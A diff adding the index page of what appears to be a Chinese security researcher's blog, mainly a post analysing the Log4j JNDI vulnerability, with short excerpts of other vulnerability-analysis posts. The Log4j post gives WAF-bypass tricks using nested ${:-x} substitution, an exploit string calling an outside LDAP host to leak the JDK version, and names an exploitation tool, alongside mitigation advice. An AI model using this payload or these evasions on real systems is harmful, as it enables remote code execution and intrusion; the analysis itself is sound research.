@@ -1,0 +1,676 @@
+<!DOCTYPE HTML>
+<html>
+<head>
+  <meta charset="utf-8">
+  
+  <title>藏青&#39;s BLOG</title>
+
+  
+  <meta name="author" content="藏青">
+  
+
+  
+  <meta name="description" content="知行合一">
+  
+
+  
+  <meta name="keywords" content="渗透 内网 代码审计">
+  
+
+  <meta id="viewport" name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, minimum-scale=1, user-scalable=no, minimal-ui">
+  <meta name="apple-mobile-web-app-capable" content="yes">
+  <meta name="apple-mobile-web-app-status-bar-style" content="black">
+
+  
+
+  <meta property="og:site_name" content="藏青&#39;s BLOG"/>
+
+  
+  <meta property="og:image" content="/favicon.ico"/>
+  
+
+  <link href="/favicon.ico" rel="icon">
+  <link rel="alternate" href="/atom.xml" title="藏青&#39;s BLOG" type="application/atom+xml">
+  <link rel="stylesheet" href="/css/style.css" media="screen" type="text/css">
+<meta name="generator" content="Hexo 5.4.0"></head>
+
+
+<body>
+<div class="blog">
+  <div class="content">
+
+    <header>
+  <div class="site-branding">
+    <h1 class="site-title">
+      <a href="/">藏青&#39;s BLOG</a>
+    </h1>
+    <p class="site-description"></p>
+  </div>
+  <nav class="site-navigation">
+    <ul>
+      
+        <li><a href="/">Home</a></li>
+      
+        <li><a href="/archives">Archives</a></li>
+      
+        <li><a href="/categories">Categories</a></li>
+      
+        <li><a href="/links">Links</a></li>
+      
+    </ul>
+  </nav>
+</header>
+
+    <main class="site-main posts-loop">
+    
+  <article>
+
+  
+    
+    <h3 class="article-title"><a href="/2021/12/13/浅谈Log4j漏洞/"><span>浅谈Log4j漏洞</span></a></h3>
+    
+  
+
+  <div class="article-top-meta">
+    <span class="posted-on">
+      <a href="/2021/12/13/浅谈Log4j漏洞/" rel="bookmark">
+        <time class="entry-date published" datetime="2021-12-13T01:21:49.000Z">
+          2021-12-13
+        </time>
+      </a>
+    </span>
+  </div>
+
+
+  
+
+  <div class="article-content">
+    <div class="entry">
+      
+        <h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>​    这个漏洞爆发已经有好几天了，从影响来看这个漏洞影响范围确实很广，算是JAVA开发框架中一个比较基础的组件，之前和同事的前辈也讨论过，未来的发展可能会越来越依赖于集成框架，如果框架本身没有问题就没事，有问题就会导致毁灭性的灾难，这次漏洞也验证了我们之前的讨论。</p>
+<h2 id="漏洞简述"><a href="#漏洞简述" class="headerlink" title="漏洞简述"></a>漏洞简述</h2><p>​    之前写过自己对于漏洞危害和有趣的比较，后来自己想想也觉得奇怪，如果是漏洞危害非常大的漏洞怎么可能是简单的漏洞呢？但实际上这次的漏洞确实就是个简单的漏洞。</p>
+<p><strong>前置知识</strong></p>
+<p>​    这个漏洞就不具体分析了，仅仅是一步一步跟代码也没有什么乐趣，我们更应该站在程序设计者的角度去理解程序的功能，下面是我对这个漏洞中遇到的关键类做了一个总结。</p>
+<p><img src="/2021/12/13/%E6%B5%85%E8%B0%88Log4j%E6%BC%8F%E6%B4%9E/image-20211212210820175.png" alt="image-20211212210820175"></p>
+<p>​    这里有个小插曲，我在查找Substitutes的资料时，发现这个类其实是Commons-lang的类。Log4j仅仅使用了这个类，我以为这次的问题也有可能是出在commons-lang包下，实际上Substitutes确实在Commons-lang包下，但是在Commons-lang中针对StrLookup接口仅仅只提供了Map取值等少数的实现，所以出现问题只是Log4j提供了StrLookup大量的实现类提供不同的解析，而其中一个实现类JndiLookup实现从JNDI获取资源并返回的功能导致了问题。</p>
+<p>​    </p>
+<p><strong>漏洞原理</strong></p>
+<blockquote>
+<p>Log4j在处理日志内容时会通过转换器对日志的内容进行转换，而MessagePatternConverter转换器会对日志中的消息内容进行转换，转换的过程调用了Substitutes.substitute完成变量到文本的替换操作，替换操作首先会调用Interpolator.lookup方法，这个方法根据前缀的不同调用不同实现类的lookup方法。当使用jndi前缀时，会通过jndi获取资源并解析。</p>
+</blockquote>
+<p>​    JNDI的问题这两年似乎比较多，其实我认为从开发者的角度，提供JNDI本身来讲是一个正常的功能，比如经常会在配置文件中使用JNDI配置数据库等等，只是有人发现它可以通过某种方式来造成危害。所以JNDI出现问题还比较多，尤其是一些比较大型的系统或者一些组件，小型的系统应该也不会用JNDI。</p>
+<h2 id="WAF绕过"><a href="#WAF绕过" class="headerlink" title="WAF绕过"></a>WAF绕过</h2><p>​    目前有下面两种绕过方法：</p>
+<ul>
+<li>编码</li>
+<li>Substitutes处理变量会进行递归处理并且可以通过${:-x}来设置默认值为x</li>
+</ul>
+<p>编码并不是一个通用的绕过方案，具体能使用什么样的编码方式来绕过还取决于组件能支持什么编码或者系统本身传入的参数就是加密的，<strong>对于加密参数导致的漏洞WAF自然拦截不到，这也是挖掘Log4j漏洞而防止WAF拦截的思路。</strong></p>
+<p>​    对于通过Substitutes处理变量的特性来绕过的方法算是一种通用的绕过方法，下面对这个方法的利用和弊端再进一步解释。</p>
+<ul>
+<li>当使用${asdas:-x}来设置默认变量，在程序解析时并不会关注key的值，key是任意值最终也只会返回默认值x。比如${${jnasdasd:xadasd}:-x}最后还是会返回x。</li>
+</ul>
+<p><img src="/2021/12/13/%E6%B5%85%E8%B0%88Log4j%E6%BC%8F%E6%B4%9E/image-20211212213514459.png" alt="image-20211212213514459"></p>
+<ul>
+<li>程序只会关注Value的值，并且Value的值可以嵌套。比如${xxx:-${:-x}}最终还是会返回x。</li>
+</ul>
+<p><img src="/2021/12/13/%E6%B5%85%E8%B0%88Log4j%E6%BC%8F%E6%B4%9E/image-20211212213641690.png" alt="image-20211212213641690"></p>
+<ul>
+<li>插入${:-}会返回空，所以可以插入任意的${:-}</li>
+</ul>
+<p><img src="/2021/12/13/%E6%B5%85%E8%B0%88Log4j%E6%BC%8F%E6%B4%9E/image-20211212213816170.png" alt="image-20211212213816170"></p>
+<p>​    这种绕过方式虽然看起来很香，我也一度像利用这个特性做一个自动混淆payload的工具，但是它有个缺点导致无法大量利用这个特性绕过WAF。<strong>即每使用一次${:-}来进行嵌套解析，就会导致利用被多触发一次。</strong></p>
+<h2 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h2><p>​    之前看网上的防御方法建议封DNSLog，但我认为这并不是一个好的解决方案，因为JNDI的利用本身并不依赖DNSLog，只要在自己服务器上开一个LDAP服务看有没有连接即可。</p>
+<p>​    关于JNDI的利用比较依赖JDK的版本，所以如果能获取到JDK的版本也有利于漏洞的后续利用。在Log4j处理变量时，根据不同的前缀进行不同的处理，在java前缀中可以通过${java:version}来获取JDK版本。再配合Substitutes递归解析变量的特性来进行利用。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$&#123;jndi:ldap://xxx.xx.xx.x:1389/$&#123;java:version&#125;&#125;</span><br></pre></td></tr></table></figure>
+
+<p>​    关于开启LDAP服务的工具，可以使用<code>JNDIExploit.jar</code>,集成了内存马和反序列化回显等多种利用方式，但需要注意通过<code>-i</code>属性指定ip不要指定127.0.0.1，否则会导致利用失败。</p>
+<p>​    最后<code>浅蓝</code>师傅提出的在SpringBoot中通过<code>ResourceBundle</code>获取<code>application.properties</code>配置文件的方式让我眼前一亮，虽然在分析到不同前缀处理方式时，我也想过通过ctx还是properties中获取有用信息的方式，但也没想到比较好的解决方法，也深感知识水平的差距。</p>
+<p>​    当我搭建<code>SpringBoot</code>尝试复现该利用方法时，发现JNDI无法触发，经过排查发现我使用IDEA默认创建的<code>SpringBoot</code>项目默认会使用自己的日志处理器而不是Log4j。所以SpringBoot<strong>在默认的配置中</strong>不会出现Log4j的漏洞，也使得这种方式的利用在SpringBoot下的可能性减少了很多。</p>
+<h2 id="漏洞修复"><a href="#漏洞修复" class="headerlink" title="漏洞修复"></a>漏洞修复</h2><p>​    漏洞刚出来的时候没有补丁包，看有个师傅提出将<code>JndiLookup</code>替换为空实现的方法，虽然暴力但是有用，后来再看有人提出直接删了这个文件的方法修复，也是有用的。但是删除文件后要不要重启，我认为是不需要的，因为JVM是使用懒加载的，只有使用<code>JndiLookup</code>才会被加载到内存，一般开发也不会用到这个类。但是如果系统已经被人利用漏洞并且触发了<code>JndiLookup</code>类的加载，这个时候就应该需要重启了，这样来看删除后重启确实是个有用的方法。</p>
+
+      
+    </div>
+
+  </div>
+
+  <div class="article-footer">
+    <div class="article-meta pull-left">
+
+    
+      
+
+    <span class="post-categories">
+      <i class="icon-categories"></i>
+        <a href="/categories/漏洞利用/">漏洞利用</a>
+    </span>
+    
+
+    
+
+    </div>
+
+    
+  </div>
+</article>
+
+
+
+  <article>
+
+  
+    
+    <h3 class="article-title"><a href="/2021/11/16/CodeQL学习笔记/"><span>CodeQL学习笔记</span></a></h3>
+    
+  
+
+  <div class="article-top-meta">
+    <span class="posted-on">
+      <a href="/2021/11/16/CodeQL学习笔记/" rel="bookmark">
+        <time class="entry-date published" datetime="2021-11-16T10:37:18.000Z">
+          2021-11-16
+        </time>
+      </a>
+    </span>
+  </div>
+
+
+  
+
+  <div class="article-content">
+    <div class="entry">
+      
+        <h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>​    在挖了一段时间的漏洞后，逐渐感觉挖洞变成了一个体力活，虽然也使用正则匹配的方式减少了部分工作量，但这种方式还是有很大的缺陷，准确率比较低，因此希望找到一种新的方式来辅助挖洞，最近CodeQL比较火，很多师傅也写了相应的文章，相对来说学习成本已经算比较低了。尽管看了很多师傅的文章，但感觉上自己对原理或者语法的学习还是比较迟钝，因此打算去分析师傅们已经写好的一些query语法，帮助自己理解。</p>
+        
+      
+    </div>
+
+  </div>
+
+  <div class="article-footer">
+    <div class="article-meta pull-left">
+
+    
+      
+
+    <span class="post-categories">
+      <i class="icon-categories"></i>
+        <a href="/categories/CodeQL/">CodeQL</a>
+    </span>
+    
+
+    
+
+    </div>
+
+    
+  </div>
+</article>
+
+
+
+  <article>
+
+  
+    
+    <h3 class="article-title"><a href="/2021/11/11/CVE-2021-40539-ManageEngine-ADSelfService-Plus漏洞分析/"><span>CVE-2021-40539 ManageEngine ADSelfService Plus漏洞分析</span></a></h3>
+    
+  
+
+  <div class="article-top-meta">
+    <span class="posted-on">
+      <a href="/2021/11/11/CVE-2021-40539-ManageEngine-ADSelfService-Plus漏洞分析/" rel="bookmark">
+        <time class="entry-date published" datetime="2021-11-11T10:31:47.000Z">
+          2021-11-11
+        </time>
+      </a>
+    </span>
+  </div>
+
+
+  
+
+  <div class="article-content">
+    <div class="entry">
+      
+        <h2 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h2><h3 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h3><p>​    该漏洞影响版本在<code>6113</code>版本以前，但是在官网上已经下载不到这个版本了，我在<a target="_blank" rel="noopener" href="https://fs2.download82.com/software/bbd8ff9dba17080c0c121804efbd61d5/manageengine-adselfservice-plus/ManageEngine_ADSelfService_Plus_64bit.exe">其他网站</a>下载了5.8的版本进行分析。</p>
+<p>​    下载好后双击exe安装，但启动过程中会卡在一个地方不动，后来我是通过双击<code>bin/run.bat</code>解决的，需要注意在选择版本的时候选择<code>free</code>版本。启动后的界面如下：</p>
+<p><img src="/2021/11/11/CVE-2021-40539-ManageEngine-ADSelfService-Plus%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20211112113129673.png" alt="image-20211112113129673"></p>
+        
+      
+    </div>
+
+  </div>
+
+  <div class="article-footer">
+    <div class="article-meta pull-left">
+
+    
+      
+
+    <span class="post-categories">
+      <i class="icon-categories"></i>
+        <a href="/categories/漏洞分析/">漏洞分析</a>
+    </span>
+    
+
+    
+
+    </div>
+
+    
+  </div>
+</article>
+
+
+
+  <article>
+
+  
+    
+    <h3 class="article-title"><a href="/2021/11/11/代码审计阶段性总结/"><span>代码审计阶段性总结</span></a></h3>
+    
+  
+
+  <div class="article-top-meta">
+    <span class="posted-on">
+      <a href="/2021/11/11/代码审计阶段性总结/" rel="bookmark">
+        <time class="entry-date published" datetime="2021-11-11T09:35:32.000Z">
+          2021-11-11
+        </time>
+      </a>
+    </span>
+  </div>
+
+
+  
+
+  <div class="article-content">
+    <div class="entry">
+      
+        <h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>​    转岗做代码审计已经快一年了，时间过的相当快。虽然自己感觉做过的事情很多，但是回头想想好像也没挖到过几个拿得出手的漏洞。因此写下篇随笔理下思路，也确定下后来发展的一个方向。</p>
+<h2 id="挖洞VS分析"><a href="#挖洞VS分析" class="headerlink" title="挖洞VS分析"></a>挖洞VS分析</h2><p>​    回顾一年的时间，发现自己写的文章主要是漏洞分析，真正用在挖洞上的时间其实并不多，这个主要还是我个人的问题，在刚开始接触审计的时候，大概是一个摸索的过程，觉得每了解一些地方或者挖到一个漏洞都比较开心，审计做的多了，慢慢形成了一种类似套路的东西，无非是找敏感函数之类的，慢慢的挖到漏洞对我来说的成就感越来越低，而且感觉用到的技术大部分是用已有知识解决的，也就觉得没什么意思了。这里可能主要是因为我挖的都是一些web应用系统的漏洞，并不是一些框架的漏洞有关。</p>
+<p>​    所以我偏向把大量的时间用在漏洞分析上，相比于挖洞，分析的每个漏洞都让我觉得非常有趣，知识也得到了增强，当然主要也是因为那些漏洞大多都有些绕，不是我靠一些套路化的找敏感函数再去回溯方法能挖出来的， 而且很多漏洞都需要对框架的底层处理比较熟悉或者是找到一个不易想到的Trike，所以每分析一个漏洞，都会给我一种正向的反馈，让我想去分析更多的漏洞。虽然分析漏洞可能没有短期来看没有什么价值产出，但我觉得如果对每个漏洞的成因都了如指掌，挖洞应该也是水到渠成的事情，所以未来的时间可能<strong>我还是会将大量的时间放在漏洞分析上</strong>。</p>
+<h2 id="危害VS有趣"><a href="#危害VS有趣" class="headerlink" title="危害VS有趣"></a>危害VS有趣</h2><p>​    虽然大多数情况下挖到危害广的漏洞一般都比较有趣，因为如果是一些很简单的漏洞，那别人应该已经挖过了，但我还是想再分析下对于审计人员来说，危害和有趣哪个重要？</p>
+<p>​    我个人认为是有趣重要，尽管挖掘到一个影响严重的漏洞从应用上对团队比较重要，但我个人觉得挖到一个有趣的漏洞对个人比较重要。如果挖到一个影响广的很简单的任意文件上传漏洞，可能我个人觉得也没什么成就感。</p>
+<h2 id="未来"><a href="#未来" class="headerlink" title="未来"></a>未来</h2><p>​    目前JAVA的审计能力也不太行，但其实我也没想要把JAVA审计做到最强，可能JAVA审计我搞到自己认为差不多了，可能会选择扩展知识面，往其他语言的审计上再去扩展，再继续的话可能是再去补一些二进制的功底去分析一些系统层面的漏洞。或者去做了解一些自动化审计的东西，漏洞上的东西搞得差不多了可能再会去了解攻防对抗的一些东西，最后又转回去做渗透。</p>
+
+      
+    </div>
+
+  </div>
+
+  <div class="article-footer">
+    <div class="article-meta pull-left">
+
+    
+      
+
+    <span class="post-categories">
+      <i class="icon-categories"></i>
+        <a href="/categories/随笔/">随笔</a>
+    </span>
+    
+
+    
+
+    </div>
+
+    
+  </div>
+</article>
+
+
+
+  <article>
+
+  
+    
+    <h3 class="article-title"><a href="/2021/11/11/Thymeleaf-SSTI漏洞分析/"><span>Thymeleaf SSTI漏洞分析</span></a></h3>
+    
+  
+
+  <div class="article-top-meta">
+    <span class="posted-on">
+      <a href="/2021/11/11/Thymeleaf-SSTI漏洞分析/" rel="bookmark">
+        <time class="entry-date published" datetime="2021-11-11T02:25:16.000Z">
+          2021-11-11
+        </time>
+      </a>
+    </span>
+  </div>
+
+
+  
+
+  <div class="article-content">
+    <div class="entry">
+      
+        <h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>​    最近看到某平台上有一篇关于SSTI的文章，之前也没了解过SSTI的漏洞，因此决定写篇文章记录学习过程。</p>
+<h2 id="模板引擎"><a href="#模板引擎" class="headerlink" title="模板引擎"></a>模板引擎</h2><p>​    要了解SSTI漏洞，首先要对模板引擎有所了解。下面是模板引擎的几个相关概念。</p>
+<blockquote>
+<p>模板引擎（这里特指用于Web开发的模板引擎）是为了使用户界面与业务数据（内容）分离而产生的，它可以生成特定格式的文档，用于网站的模板引擎就会生成一个标准的文档。</p>
+<p>模板引擎的本质是将模板文件和数据通过模板引擎生成最终的HTML代码。</p>
+<p>模板引擎不属于特定技术领域，它是跨领域跨平台的概念。</p>
+</blockquote>
+        
+      
+    </div>
+
+  </div>
+
+  <div class="article-footer">
+    <div class="article-meta pull-left">
+
+    
+      
+
+    <span class="post-categories">
+      <i class="icon-categories"></i>
+        <a href="/categories/漏洞分析/">漏洞分析</a>
+    </span>
+    
+
+    
+
+    </div>
+
+    
+  </div>
+</article>
+
+
+
+  <article>
+
+  
+    
+    <h3 class="article-title"><a href="/2021/10/28/resin解析漏洞分析/"><span>resin解析漏洞分析</span></a></h3>
+    
+  
+
+  <div class="article-top-meta">
+    <span class="posted-on">
+      <a href="/2021/10/28/resin解析漏洞分析/" rel="bookmark">
+        <time class="entry-date published" datetime="2021-10-28T09:51:41.000Z">
+          2021-10-28
+        </time>
+      </a>
+    </span>
+  </div>
+
+
+  
+
+  <div class="article-content">
+    <div class="entry">
+      
+        <h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>​    前阵子看有师傅在公众号上发表了<code>Resin解析漏洞分析</code>，我们也知道有个常用的OA用的就是<code>Resin</code>，因此我认为了解它的漏洞是十分必要的。</p>
+        
+      
+    </div>
+
+  </div>
+
+  <div class="article-footer">
+    <div class="article-meta pull-left">
+
+    
+      
+
+    <span class="post-categories">
+      <i class="icon-categories"></i>
+        <a href="/categories/漏洞分析/">漏洞分析</a>
+    </span>
+    
+
+    
+
+    </div>
+
+    
+  </div>
+</article>
+
+
+
+  <article>
+
+  
+    
+    <h3 class="article-title"><a href="/2021/10/26/Confluence任意文件读取（CVE-2021-26085）漏洞分析/"><span>Confluence文件读取漏洞分析</span></a></h3>
+    
+  
+
+  <div class="article-top-meta">
+    <span class="posted-on">
+      <a href="/2021/10/26/Confluence任意文件读取（CVE-2021-26085）漏洞分析/" rel="bookmark">
+        <time class="entry-date published" datetime="2021-10-26T03:44:50.000Z">
+          2021-10-26
+        </time>
+      </a>
+    </span>
+  </div>
+
+
+  
+
+  <div class="article-content">
+    <div class="entry">
+      
+        <h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>​    前段时间<code>Confluence</code>发布了<code>CVE-2021-26085</code>补丁，刚好之前分析过<code>Confluence</code>的漏洞，免去了搭建漏洞分析环境的麻烦，因此分析下这个漏洞。</p>
+        
+      
+    </div>
+
+  </div>
+
+  <div class="article-footer">
+    <div class="article-meta pull-left">
+
+    
+      
+
+    <span class="post-categories">
+      <i class="icon-categories"></i>
+        <a href="/categories/漏洞分析/">漏洞分析</a>
+    </span>
+    
+
+    
+
+    </div>
+
+    
+  </div>
+</article>
+
+
+
+  <article>
+
+  
+    
+    <h3 class="article-title"><a href="/2021/10/23/JDBC-XXE漏洞分析/"><span>JDBC XXE漏洞分析</span></a></h3>
+    
+  
+
+  <div class="article-top-meta">
+    <span class="posted-on">
+      <a href="/2021/10/23/JDBC-XXE漏洞分析/" rel="bookmark">
+        <time class="entry-date published" datetime="2021-10-23T03:58:09.000Z">
+          2021-10-23
+        </time>
+      </a>
+    </span>
+  </div>
+
+
+  
+
+  <div class="article-content">
+    <div class="entry">
+      
+        <h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>​    最近 <code>JDBC</code>爆了一个<code>XXE</code>漏洞，很久没有分析漏洞了，趁着周末没事分析下这个漏洞。</p>
+<h2 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h2><blockquote>
+<p>10月21日,”阿里云应急响应”公众号发布Oracle Mysql JDBC存在XXE漏洞,造成漏洞的原因主要是因为<code>getSource</code>方法未对传入的XML格式数据进行检验。导致攻击者可构造恶意的XML数据引入外部实体。造成XXE攻击。</p>
+<p>影响版本: <code>&lt; MySQL JDBC 8.0.27</code></p>
+</blockquote>
+        
+      
+    </div>
+
+  </div>
+
+  <div class="article-footer">
+    <div class="article-meta pull-left">
+
+    
+      
+
+    <span class="post-categories">
+      <i class="icon-categories"></i>
+        <a href="/categories/漏洞分析/">漏洞分析</a>
+    </span>
+    
+
+    
+
+    </div>
+
+    
+  </div>
+</article>
+
+
+
+  <article>
+
+  
+    
+    <h3 class="article-title"><a href="/2021/10/23/用友NC6-5文件上传漏洞分析/"><span>用友NC6.5文件上传漏洞分析</span></a></h3>
+    
+  
+
+  <div class="article-top-meta">
+    <span class="posted-on">
+      <a href="/2021/10/23/用友NC6-5文件上传漏洞分析/" rel="bookmark">
+        <time class="entry-date published" datetime="2021-10-23T03:49:38.000Z">
+          2021-10-23
+        </time>
+      </a>
+    </span>
+  </div>
+
+
+  
+
+  <div class="article-content">
+    <div class="entry">
+      
+        <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">用友NC这个系统在国内用户量还是挺多的，由于这个系统本身不开源且代码量极多，所以这个系统可能会存在大量的漏洞但挖掘的人相对较少，所以还是值得花时间去挖掘漏洞的，本次和大家一起分析用友NC6.5的任意文件上传漏洞，由于这个上传接口是将传入的数据反序列化解析后再上传的，所以exp对于很多同学来说不太容易构造，本次就带大家一起分析一下这个漏洞，文章的最后我会给出大家这个漏洞的exp。</span><br></pre></td></tr></table></figure>
+        
+      
+    </div>
+
+  </div>
+
+  <div class="article-footer">
+    <div class="article-meta pull-left">
+
+    
+      
+
+    <span class="post-categories">
+      <i class="icon-categories"></i>
+        <a href="/categories/漏洞分析/">漏洞分析</a>
+    </span>
+    
+
+    
+
+    </div>
+
+    
+  </div>
+</article>
+
+
+
+  <article>
+
+  
+    
+    <h3 class="article-title"><a href="/2021/10/22/CC1利用链分析/"><span>CC1利用链分析</span></a></h3>
+    
+  
+
+  <div class="article-top-meta">
+    <span class="posted-on">
+      <a href="/2021/10/22/CC1利用链分析/" rel="bookmark">
+        <time class="entry-date published" datetime="2021-10-22T03:47:04.000Z">
+          2021-10-22
+        </time>
+      </a>
+    </span>
+  </div>
+
+
+  
+
+  <div class="article-content">
+    <div class="entry">
+      
+        <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">这个利用链小兄弟们都分析过了，所以我大概了解下。主要是解决我看到这个利用链的一些疑惑。这条利用链的POC如下。</span><br></pre></td></tr></table></figure>
+        
+      
+    </div>
+
+  </div>
+
+  <div class="article-footer">
+    <div class="article-meta pull-left">
+
+    
+      
+
+    <span class="post-categories">
+      <i class="icon-categories"></i>
+        <a href="/categories/反序列化/">反序列化</a>
+    </span>
+    
+
+    
+
+    </div>
+
+    
+  </div>
+</article>
+
+
+
+
+<nav class="pagination">
+  
+  
+  <a href="/page/2/" class="pagination-next">Next</a>
+  
+</nav>
+    </main>
+
+    <footer class="site-footer">
+  <p class="site-info">
+    Proudly powered by <a href="https://hexo.io/" target="_blank">Hexo</a> and
+    Theme by <a href="https://github.com/CodeDaraW/Hacker" target="_blank">Hacker</a>
+    </br>
+    
+    &copy; 2021 藏青
+    
+  </p>
+</footer>
+    
+    
+  </div>
+</div>
+</body>
+</html>
